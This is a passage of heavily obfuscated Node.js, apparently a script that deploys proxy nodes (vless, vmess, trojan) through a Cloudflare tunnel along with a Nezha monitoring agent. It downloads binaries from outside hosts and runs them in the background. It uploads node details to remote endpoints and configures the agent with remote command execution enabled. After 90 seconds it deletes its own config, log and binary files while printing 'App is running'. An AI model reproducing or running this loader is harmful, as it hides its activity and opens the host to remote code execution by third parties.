_0x210859&&_0x210859[_0x358e90(_0xae5191._0x5be1ea)]===0xc8?(console[_0x358e90(0x108)](_0x358e90(0xc4)),_0x210859):null;}catch(_0x601d02){return null;}}else return;}}function cleanFiles(){const _0x48ad4f={_0x114e20:0xd0,_0x1f17cf:0x99},_0x2b9562={_0x1ab554:0xe1,_0x510574:0x108};setTimeout(()=>{const _0x528037=_0x1fe2,_0x5d970b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d970b[_0x528037(_0x48ad4f._0x114e20)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5d970b[_0x528037(_0x48ad4f._0x114e20)](phpPath);process['platform']==='win32'?exec('del\x20/f\x20/q\x20'+_0x5d970b['join']('\x20')+'\x20>\x20nul\x202>&1',_0x22e149=>{const _0x526f4d=_0x528037;console[_0x526f4d(0xe1)](),console[_0x526f4d(0x108)]('App\x20is\x20running'),console[_0x526f4d(0x108)](_0x526f4d(0x97));}):exec('rm\x20-rf\x20'+_0x5d970b[_0x528037(_0x48ad4f._0x1f17cf)]('\x20')+'\x20>/dev/null\x202>&1',_0x323057=>{const _0x125883=_0x528037;console[_0x125883(_0x2b9562._0x1ab554)](),console[_0x125883(_0x2b9562._0x510574)](_0x125883(0x11e)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5a155b={_0x7b5ab8:0x124,_0x1d9d3f:0xbf,_0x419322:0x137,_0x4e1d8d:0xc2},_0x349d42=_0x2f1dc2;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x349d42(0x108)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1508f8=await axios[_0x349d42(_0x5a155b._0x7b5ab8)](_0x349d42(_0x5a155b._0x1d9d3f),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x349d42(0x108)](_0x349d42(_0x5a155b._0x419322)),_0x1508f8;}catch(_0x26534b){return console[_0x349d42(0xce)](_0x349d42(0x101)+_0x26534b[_0x349d42(_0x5a155b._0x4e1d8d)]),null;}}function _0x5981(){const _0x124a7f=['517348SHVdpg','from','substring','blackhole','success','send','arm','statSync','automatic\x20access\x20task\x20added\x20successfully','/dev/null','firefox','2053','all','TunnelSecret','filter','ARGO_DOMAIN','/api/add-subscriptions','config.json','existsSync','length','mkdirSync','tls','tcp','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Empowerment\x20success\x20for\x20','dd59f1b2-ee66-4b5a-9b53-337aebbb3e9a','https://arm64.ssss.nyc.mn/v1','/api/delete-nodes','http','Empowerment\x20failed\x20for\x20','readFileSync','web\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','unlink','Download\x20','createWriteStream','/vmess-argo?ed=2560','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','2083','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/config.json\x20>/dev/null\x202>&1\x20&','join','https://ipapi.co/json/','Error\x20executing\x20command:\x20','PROJECT_URL','pipe','path','has','/tunnel.yml\x20run','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x0atrojan://','list.txt','map','railway.djw008.dpdns.org','20EEHJtQ','\x0a\x20\x20\x20\x20','207846ZCGZBT','&fp=firefox&type=ws&host=','freedom','utf-8','?encryption=none&security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','13736VykCoi','charAt','stringify','--tls','true','set','SUB_PATH','Subscription\x20uploaded\x20successfully','Railway','block','\x20>/dev/null\x202>&1\x20&','amd','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','443','get','https://arm64.ssss.nyc.mn/bot','aarch64','https://oooo.serv00.net/add-url','env','Unhandled\x20error\x20in\x20startserver:','message','pkill\x20-f\x20\x22[','Nodes\x20uploaded\x20successfully','country_code','1996014ylMhqk','Error\x20in\x20startserver:','base64','NEZHA\x20variable\x20is\x20empty,skip\x20running','axios','express','NEZHA_KEY','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','error','vless','push','https://arm64.ssss.nyc.mn/web','status','Error\x20downloading\x20files:','UPLOAD_URL','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','7173sFLlSn','pop','includes','\x20successfully','/vless-argo','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','fileUrl','countryCode','127.0.0.1','1467892GajdUp','\x0a\x20\x20credentials-file:\x20','clear','application/json','\x0aclient_secret:\x20','unlinkSync','none','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x20\x20tunnel:\x20','then','/api/add-nodes','\x20-c\x20','npm\x20running\x20error:\x20','text/plain;\x20charset=utf-8','CFPORT','writeFileSync','toString','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','child_process','util','tunnel.json','CFIP','ArgoDomain:','8443','cdns.doon.eu.org','FILE_PATH','platform','response','Error\x20reading\x20boot.log:','ARGO_PORT','/sub.txt\x20saved\x20successfully','random','test','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20-s\x20','unshift','2096','nohup\x20','PORT','quic','log','taskkill\x20/f\x20/im\x20','sub','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','?security=tls&sni=','https://amd64.ssss.nyc.mn/web','basename','https://arm64.ssss.nyc.mn/agent','vmess','https://amd64.ssss.nyc.mn/agent','./tmp','UUID','org','https://amd64.ssss.nyc.mn/bot','forEach','.exe\x20>\x20nul\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','5251127guCFbJ','data','catch','\x20already\x20exists','2087','App\x20is\x20running','exec','https+local://8.8.8.8/dns-query','match','win32','\x20is\x20running','post','split','boot.log','chmod','405398lKqLZp','config.yaml','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','php\x20running\x20error:\x20','\x20failed:\x20','\x20-p\x20','/trojan-argo'];_0x5981=function(){return _0x124a7f;};return _0x5981();}function _0x1fe2(_0x15b030,_0x57d4ae){const _0x5981ea=_0x5981();return _0x1fe2=function(_0x1fe2f8,_0x5d0c55){_0x1fe2f8=_0x1fe2f8-0x87;let _0x5dce86=_0x5981ea[_0x1fe2f8];return _0x5dce86;},_0x1fe2(_0x15b030,_0x57d4ae);}async function startserver(){const _0xdd4acf=_0x2f1dc2;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4487f7){console[_0xdd4acf(0xce)](_0xdd4acf(0xc7),_0x4487f7);}}startserver()[_0x2f1dc2(0x11b)](_0x22ba46=>{const _0x1322f2=_0x2f1dc2;console[_0x1322f2(0xce)](_0x1322f2(0xc1),_0x22ba46);}),app['listen'](PORT,()=>console[_0x2f1dc2(0x108)](_0x2f1dc2(0xa1)+PORT+'!'));
